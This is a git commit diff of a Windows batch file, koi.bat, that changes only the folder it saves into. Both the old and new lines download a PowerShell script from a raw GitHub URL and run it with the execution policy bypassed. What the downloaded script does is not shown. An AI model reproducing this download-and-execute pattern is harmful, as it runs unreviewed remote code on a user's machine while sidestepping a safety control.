c3bdd4c4de621010231a7627687c0edc455c8e35
jdo19181918 <jdoe19181918@gmail.com>
2024-07-15 16:32:29 -0600

    Update koi.bat

--- koi.bat
+++ koi.bat
@@ -1,4 +1,4 @@
-PowerShell -NoProfile -ExecutionPolicy Bypass -Command "Invoke-WebRequest -Uri https://raw.githubusercontent.com/jdo19181918/Test/main/koi.ps1 -OutFile C:\Users\Public\Desktop\koi.ps1"
+PowerShell -NoProfile -ExecutionPolicy Bypass -Command "Invoke-WebRequest -Uri https://raw.githubusercontent.com/jdo19181918/Test/main/koi.ps1 -OutFile C:\Users\Public\Downloads\koi.ps1"
 timeout 5
-powershell.exe -Noprofile -Noninteractive -Nologo -ExecutionPolicy Bypass -File "C:\Users\Public\Desktop\koi.ps1"
+powershell.exe -Noprofile -Noninteractive -Nologo -ExecutionPolicy Bypass -File "C:\Users\Public\Downloads\koi.ps1"
 pause
